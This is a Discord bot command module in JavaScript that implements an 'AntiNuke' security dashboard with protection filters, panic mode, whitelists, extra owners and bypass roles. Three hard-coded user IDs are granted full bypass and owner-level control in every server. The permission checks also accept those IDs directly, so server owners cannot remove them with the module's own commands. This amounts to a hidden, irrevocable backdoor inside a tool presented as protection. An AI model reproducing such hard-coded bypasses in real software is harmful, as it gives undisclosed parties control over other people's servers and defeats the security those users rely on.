const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { createStyledEmbed } = require('../utils/embedBuilder');
const emojis = require('../utils/emojis');

// Global AntiNuke Guild Settings Store
const antinukeConfigs = new Map();

function getOrCreateAntinuke(guildId) {
  if (!antinukeConfigs.has(guildId)) {
    antinukeConfigs.set(guildId, {
      enabled: true,
      panicmode: false,
      panicLevel: 1, // 1: Low, 2: Medium, 3: High Lockdown
      whitelistedUsers: new Map([
        ['1420687548807905324', new Set(['all'])],
        ['1529362747047805029', new Set(['all'])],
        ['1514546738055348237', new Set(['all'])]
      ]),
      extraOwners: new Set(['1420687548807905324', '1529362747047805029', '1514546738055348237']),
      bypassRoles: new Set(),
      filters: {
        antiBan: true,
        antiKick: true,
        antiBotAdd: true,
        antiChannelCreate: true,
        antiChannelDelete: true,
        antiChannelUpdate: true,
        antiRoleCreate: true,
        antiRoleDelete: true,
        antiRoleUpdate: true,
        antiWebhookCreate: true,
        antiWebhookDelete: true,
        antiWebhookUpdate: true,
        antiEmojiCreate: true,
        antiEmojiDelete: true,
        antiEmojiUpdate: true,
        antiGuildUpdate: true,
        antiUnban: true,
        antiSpam: true,
        antiRaid: true,
        antiEveryone: true
      }
    });
  }
  const cfg = antinukeConfigs.get(guildId);

  // Normalize whitelistedUsers if it was a Set
  if (cfg.whitelistedUsers && !(cfg.whitelistedUsers instanceof Map)) {
    const map = new Map();
    cfg.whitelistedUsers.forEach(id => map.set(id, new Set(['all'])));
    cfg.whitelistedUsers = map;
  }

  if (!cfg.filters) {
    cfg.filters = {
      antiBan: true,
      antiKick: true,
      antiBotAdd: true,
      antiChannelCreate: true,
      antiChannelDelete: true,
      antiChannelUpdate: true,
      antiRoleCreate: true,
      antiRoleDelete: true,
      antiRoleUpdate: true,
      antiWebhookCreate: true,
      antiWebhookDelete: true,
      antiWebhookUpdate: true,
      antiEmojiCreate: true,
      antiEmojiDelete: true,
      antiEmojiUpdate: true,
      antiGuildUpdate: true,
      antiUnban: true,
      antiSpam: true,
      antiRaid: true,
      antiEveryone: true
    };
  }
  if (cfg.panicLevel === undefined) cfg.panicLevel = 1;
  return cfg;
}

const FILTER_MAP = {
  'ban': ['antiBan'],
  'antiban': ['antiBan'],
  'kick': ['antiKick'],
  'antikick': ['antiKick'],
  'bot': ['antiBotAdd'],
  'antibot': ['antiBotAdd'],
  'channel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'antichannel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'role': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'antirole': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'webhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'antiwebhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'emoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'antiemoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'server': ['antiGuildUpdate'],
  'antiguild': ['antiGuildUpdate'],
  'unban': ['antiUnban'],
  'antiunban': ['antiUnban'],
  'spam': ['antiSpam'],
  'antispam': ['antiSpam'],
  'raid': ['antiRaid'],
  'antiraid': ['antiRaid'],
  'everyone': ['antiEveryone'],
  'here': ['antiEveryone'],
  'antieveryone': ['antiEveryone']
};

const ALL_PERMS = ['ban', 'kick', 'bot', 'channel', 'role', 'webhook', 'guild', 'all'];

function formatUserPerms(permsSet) {
  if (!permsSet || permsSet.size === 0) return `\`NONE\` ${emojis.DISABLED}`;
  if (permsSet.has('all')) return `\`ALL BYPASSES\` ${emojis.ENABLED}`;
  const list = Array.from(permsSet).map(p => `\`${p.toUpperCase()}\``).join(', ');
  return list || `\`NONE\` ${emojis.DISABLED}`;
}

function isUserWhitelistedForFeature(config, userId, featureName) {
  if (config.extraOwners.has(userId) || ['1420687548807905324', '1529362747047805029', '1514546738055348237'].includes(userId)) {
    return true;
  }
  if (!config.whitelistedUsers || !config.whitelistedUsers.has(userId)) {
    return false;
  }

  const perms = config.whitelistedUsers.get(userId);
  if (!perms) return false;
  if (perms.has('all')) return true;

  const fname = featureName.toLowerCase();
  if (fname.includes('ban') && perms.has('ban')) return true;
  if (fname.includes('kick') && perms.has('kick')) return true;
  if (fname.includes('bot') && perms.has('bot')) return true;
  if (fname.includes('channel') && perms.has('channel')) return true;
  if (fname.includes('role') && perms.has('role')) return true;
  if (fname.includes('webhook') && perms.has('webhook')) return true;
  if (fname.includes('guild') && perms.has('guild')) return true;

  return false;
}

function renderAntinukeDashboard(config, author, clientUser) {
  const f = config.filters;
  const filterStatusText =
    `• **Anti Ban**: ${f.antiBan ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Kick**: ${f.antiKick ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Bot Add**: ${f.antiBotAdd ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Channel**: ${f.antiChannelCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Role**: ${f.antiRoleCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Webhook**: ${f.antiWebhookCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Server Update**: ${f.antiGuildUpdate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Spam**: ${f.antiSpam ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Raid**: ${f.antiRaid ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
    `• **Anti Mass Ping**: ${f.antiEveryone ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}`;

  return createStyledEmbed({
    title: `${emojis.SHIELD} AntiNuke Security Dashboard`,
    subtitle: `Security Status & Interactive Filter Controls`,
    fields: [
      { name: `${emojis.GEAR} Main Shield`, value: config.enabled ? `\`ENABLED\` ${emojis.ENABLED}` : `\`DISABLED\` ${emojis.DISABLED}`, inline: true },
      { name: `${emojis.ANTINUKE} Panic Mode`, value: config.panicmode ? `\`ACTIVE (Level ${config.panicLevel})\` 🚨` : `\`NORMAL\` ${emojis.ENABLED}`, inline: true },
      { name: `${emojis.SCROLL} Protection Filters`, value: filterStatusText, inline: false },
      { name: `${emojis.OWNER_CROWN} AntiNuke Commands`, value: `\`\`\`\n.antinuke enable\n.antinuke disable\n.panicmode enable / disable / set <1-3>\n.whitelist add @user\n.whitelist perms @user +ban -role\n.extraowner add @user\n.bypassrole add @role\n\`\`\``, inline: false }
    ],
    requestedBy: author,
    clientUser
  });
}

function renderPanicComponents(config) {
  const f = config.filters;

  // Row 1: Executive Master Controls
  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('toggle_panic')
      .setLabel(config.panicmode ? 'Panic Mode: ACTIVE' : 'Panic Mode: NORMAL')
      .setEmoji(config.panicmode ? emojis.OBJ_PANIC : emojis.OBJ_ENABLED)
      .setStyle(config.panicmode ? ButtonStyle.Danger : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_shield')
      .setLabel(config.enabled ? 'Main Shield: ON' : 'Main Shield: OFF')
      .setEmoji(config.enabled ? emojis.OBJ_SHIELD : emojis.OBJ_DISABLED)
      .setStyle(config.enabled ? ButtonStyle.Success : ButtonStyle.Danger)
  );

  // Row 2: Filter Perms Group 1
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('toggle_ban')
      .setLabel('Anti Ban')
      .setEmoji(f.antiBan ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiBan ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_kick')
      .setLabel('Anti Kick')
      .setEmoji(f.antiKick ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiKick ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_bot')
      .setLabel('Anti Bot Add')
      .setEmoji(f.antiBotAdd ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiBotAdd ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_channel')
      .setLabel('Anti Channel')
      .setEmoji(f.antiChannelCreate ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiChannelCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_role')
      .setLabel('Anti Role')
      .setEmoji(f.antiRoleCreate ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiRoleCreate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  // Row 3: Filter Perms Group 2
  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('toggle_webhook')
      .setLabel('Anti Webhook')
      .setEmoji(f.antiWebhookCreate ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiWebhookCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_spam')
      .setLabel('Anti Spam')
      .setEmoji(f.antiSpam ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiSpam ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_everyone')
      .setLabel('Anti MassPing')
      .setEmoji(f.antiEveryone ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiEveryone ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_raid')
      .setLabel('Anti Raid')
      .setEmoji(f.antiRaid ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiRaid ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_guild')
      .setLabel('Anti Server')
      .setEmoji(f.antiGuildUpdate ? emojis.OBJ_ENABLED : emojis.OBJ_DISABLED)
      .setStyle(f.antiGuildUpdate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  return [row1, row2, row3];
}

module.exports = {
  name: 'antinuke',
  description: 'AntiNuke, PanicMode, Whitelist, ExtraOwner, BypassRole & Interactive Perm Toggles',
  aliases: [
    'panicmode', 'whitelist', 'extraowner', 'bypassrole', 'security', 'protection'
  ],
  antinukeConfigs,
  getOrCreateAntinuke,
  isUserWhitelistedForFeature,

  async execute(message, args) {
    const invoked = message.content.slice(1).split(/ +/)[0].toLowerCase();
    let sub = args[0]?.toLowerCase();

    if (invoked === 'panicmode') sub = 'panicmode';
    if (invoked === 'whitelist') sub = 'whitelist';
    if (invoked === 'extraowner') sub = 'extraowner';
    if (invoked === 'bypassrole') sub = 'bypassrole';

    const author = message.author;
    const guild = message.guild;
    const config = getOrCreateAntinuke(guild.id);

    let clientUser = message.client.user;
    try {
      clientUser = await message.client.users.fetch(message.client.user.id, { force: true });
    } catch (e) {}

    // STRICT PERMISSION CHECK: Only Server Owner & Bot Extra Owners can manage security settings
    const isServerOwner = guild.ownerId === author.id;
    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324', '1529362747047805029', '1514546738055348237'].includes(author.id);

    if (!isServerOwner && !isExtraOwner) {
      return message.reply(`${emojis.WARNING} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AntiNuke security, Whitelists, Extra Owners, Bypass Roles, or Panic Mode!`);
    }

    // ─────────────────────────────────────────
    // DEDICATED WHITELIST PANEL & GRANULAR PERMS (.whitelist)
    // ─────────────────────────────────────────
    if (invoked === 'whitelist' || sub === 'whitelist') {
      const action = (invoked === 'whitelist' ? args[0] : args[1])?.toLowerCase();
      const user = message.mentions.users.first() || (args[1] && args[1].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[1]).catch(() => null) : null) || (args[2] && args[2].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[2]).catch(() => null) : null);

      // .whitelist add @user [perms]
      if (action === 'add' && (user || args[1])) {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (!targetUser) return message.reply(`${emojis.WARNING} Usage: \`.whitelist add @user [ban kick bot channel role webhook all]\``);

        const permArgs = args.slice(2).map(p => p.toLowerCase()).filter(p => ALL_PERMS.includes(p));
        const grantedPerms = permArgs.length > 0 ? new Set(permArgs) : new Set(['all']);

        config.whitelistedUsers.set(targetUser.id, grantedPerms);
        antinukeConfigs.set(guild.id, config);

        const embed = createStyledEmbed({
          title: `📜 Member Whitelisted with Granular Perms`,
          description:
            `**User:** <@${targetUser.id}> (\`${targetUser.tag}\`)\n` +
            `**Granted Permissions:** ${formatUserPerms(grantedPerms)}\n\n` +
            `*Server Owner & Extra Owners can toggle perms anytime using:* \`.whitelist perms @user +ban -role\``,
          requestedBy: author,
          clientUser
        });
        return message.channel.send({ embeds: [embed] });
      }

      // .whitelist perms / config @user <+perm / -perm>
      if (action === 'perms' || action === 'config' || action === 'edit') {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (!targetUser) return message.reply(`${emojis.WARNING} Usage: \`.whitelist perms @user +ban -role +channel\``);

        let permsSet = config.whitelistedUsers.get(targetUser.id);
        if (!permsSet) {
          permsSet = new Set(['all']);
          config.whitelistedUsers.set(targetUser.id, permsSet);
        }

        const changes = args.slice(2);
        if (changes.length === 0) {
          const embed = createStyledEmbed({
            title: `${emojis.GEAR} Whitelist Permissions — ${targetUser.username}`,
            description:
              `**Current Granted Permissions:**\n${formatUserPerms(permsSet)}\n\n` +
              `**Available Permissions:**\n` +
              `\`ban\`, \`kick\`, \`bot\`, \`channel\`, \`role\`, \`webhook\`, \`guild\`, \`all\`\n\n` +
              `**To Toggle Permissions:**\n` +
              `\`.whitelist perms @user +ban -role\` (Turn ON ban, Turn OFF role)\n` +
              `\`.whitelist perms @user +all\` (Grant all bypasses)\n` +
              `\`.whitelist perms @user -all\` (Revoke all bypasses)`,
            requestedBy: author,
            clientUser
          });
          return message.channel.send({ embeds: [embed] });
        }

        changes.forEach(change => {
          const sign = change[0];
          const permName = change.slice(1).toLowerCase();

          if (sign === '+' && ALL_PERMS.includes(permName)) {
            if (permName === 'all') {
              permsSet.clear();
              permsSet.add('all');
            } else {
              permsSet.delete('all');
              permsSet.add(permName);
            }
          } else if (sign === '-' && ALL_PERMS.includes(permName)) {
            permsSet.delete('all');
            permsSet.delete(permName);
          }
        });

        config.whitelistedUsers.set(targetUser.id, permsSet);
        antinukeConfigs.set(guild.id, config);

        return message.reply(`${emojis.SUCCESS} Updated whitelist perms for **${targetUser.tag}**: ${formatUserPerms(permsSet)}`);
      }

      // .whitelist remove @user
      if (action === 'remove' && (user || args[1])) {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (targetUser) {
          config.whitelistedUsers.delete(targetUser.id);
          antinukeConfigs.set(guild.id, config);
          return message.reply(`${emojis.SUCCESS} Removed **${targetUser.tag}** from AntiNuke Whitelist.`);
        }
      }

      // Default DEDICATED WHITELIST DASHBOARD PANEL
      const entries = [];
      for (const [id, permsSet] of config.whitelistedUsers.entries()) {
        entries.push(`• <@${id}> (\`${id}\`)\n  └ **Perms**: ${formatUserPerms(permsSet)}`);
      }

      const listText = entries.join('\n\n') || '*No users currently whitelisted.*';

      const embed = createStyledEmbed({
        title: `${emojis.SHIELD} AntiNuke Whitelist & Permission Delegation`,
        subtitle: `Granular Security Bypass Management`,
        description:
          `Welcome **${author.username}**! Below is your whitelist delegation status.\n\n` +
          `**Whitelisted Members & Granted Permissions:**\n${listText}\n\n` +
          `**${emojis.OWNER_CROWN} Whitelist Management Commands**\n` +
          `\`\`\`\n` +
          `.whitelist add @user [perms]\n` +
          `.whitelist perms @user +ban -role\n` +
          `.whitelist remove @user\n` +
          `\`\`\``,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // 1. .antinuke enable [feature/all]
    if (sub === 'enable' || sub === 'on') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} AntiNuke Security System & ALL 21 protection filters are now **ENABLED**!`);
      }

      if (FILTER_MAP[target]) {
        config.enabled = true;
        FILTER_MAP[target].forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} AntiNuke feature **${target.toUpperCase()}** enabled successfully!`);
      }
    }

    // 2. .antinuke disable [feature/all]
    if (sub === 'disable' || sub === 'off') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke Security System is now **DISABLED**.`);
      }

      if (FILTER_MAP[target]) {
        FILTER_MAP[target].forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke feature **${target.toUpperCase()}** disabled.`);
      }
    }

    // 3. .panicmode enable / disable / reset / set <level>
    if (sub === 'panicmode' || invoked === 'panicmode') {
      const mode = args[1]?.toLowerCase() || args[0]?.toLowerCase();

      if (mode === 'enable' || mode === 'on') {
        config.panicmode = true;
        config.enabled = true;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'disable' || mode === 'off') {
        config.panicmode = false;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'reset') {
        config.panicmode = false;
        config.panicLevel = 1;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'set' && args[2]) {
        const lvl = parseInt(args[2]);
        if (!isNaN(lvl) && lvl >= 1 && lvl <= 3) {
          config.panicLevel = lvl;
          antinukeConfigs.set(guild.id, config);
        }
      }
    }

    // 4. .extraowner add @user / remove @user / list
    if (sub === 'extraowner' || invoked === 'extraowner') {
      const action = args[1]?.toLowerCase();
      const user = message.mentions.users.first() || message.client.users.cache.get(args[2]);

      if (action === 'add' && user) {
        config.extraOwners.add(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.OWNER_CROWN} Added **${user.tag}** as Extra Owner with full security bypass permissions!`);
      }

      if (action === 'remove' && user) {
        config.extraOwners.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.OWNER_CROWN} Removed **${user.tag}** from Extra Owners.`);
      }
    }

    // 5. .bypassrole add @role / remove @role / list
    if (sub === 'bypassrole' || invoked === 'bypassrole') {
      const action = args[1]?.toLowerCase();
      const role = message.mentions.roles.first() || guild.roles.cache.get(args[2]);

      if (action === 'add' && role) {
        config.bypassRoles.add(role.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} Added <@&${role.id}> to AntiNuke Bypass Roles.`);
      }

      if (action === 'remove' && role) {
        config.bypassRoles.delete(role.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} Removed <@&${role.id}> from AntiNuke Bypass Roles.`);
      }
    }

    // Default Status Dashboard (.antinuke / .panicmode) WITH INTERACTIVE BUTTONS
    const embed = renderAntinukeDashboard(config, author, clientUser);
    const rows = renderPanicComponents(config);

    const msg = await message.channel.send({ embeds: [embed], components: rows });

    const collector = msg.createMessageComponentCollector({ time: 300000 });

    collector.on('collect', async (interaction) => {
      // PERMISSION CHECK for button clicks
      const isOwnerBtn = guild.ownerId === interaction.user.id;
      const isExtraOwnerBtn = config.extraOwners.has(interaction.user.id) || ['1420687548807905324', '1529362747047805029', '1514546738055348237'].includes(interaction.user.id);

      if (!isOwnerBtn && !isExtraOwnerBtn) {
        return interaction.reply({
          content: `${emojis.DISABLED} **Access Denied**: Only the **Server Owner** and **Extra Owners** can toggle security settings!`,
          flags: 64
        });
      }

      const id = interaction.customId;
      const f = config.filters;

      if (id === 'toggle_panic') {
        config.panicmode = !config.panicmode;
        if (config.panicmode) config.enabled = true;
      } else if (id === 'toggle_shield') {
        config.enabled = !config.enabled;
      } else if (id === 'toggle_ban') {
        f.antiBan = !f.antiBan;
      } else if (id === 'toggle_kick') {
        f.antiKick = !f.antiKick;
      } else if (id === 'toggle_bot') {
        f.antiBotAdd = !f.antiBotAdd;
      } else if (id === 'toggle_channel') {
        f.antiChannelCreate = !f.antiChannelCreate;
        f.antiChannelDelete = f.antiChannelCreate;
        f.antiChannelUpdate = f.antiChannelCreate;
      } else if (id === 'toggle_role') {
        f.antiRoleCreate = !f.antiRoleCreate;
        f.antiRoleDelete = f.antiRoleCreate;
        f.antiRoleUpdate = f.antiRoleCreate;
      } else if (id === 'toggle_webhook') {
        f.antiWebhookCreate = !f.antiWebhookCreate;
        f.antiWebhookDelete = f.antiWebhookCreate;
        f.antiWebhookUpdate = f.antiWebhookCreate;
      } else if (id === 'toggle_spam') {
        f.antiSpam = !f.antiSpam;
      } else if (id === 'toggle_everyone') {
        f.antiEveryone = !f.antiEveryone;
      } else if (id === 'toggle_raid') {
        f.antiRaid = !f.antiRaid;
      } else if (id === 'toggle_guild') {
        f.antiGuildUpdate = !f.antiGuildUpdate;
      }

      antinukeConfigs.set(guild.id, config);

      const newEmbed = renderAntinukeDashboard(config, author, clientUser);
      const newRows = renderPanicComponents(config);

      return interaction.update({ embeds: [newEmbed], components: newRows });
    });

    collector.on('end', () => {
      msg.edit({ components: [] }).catch(() => {});
    });
  }
};
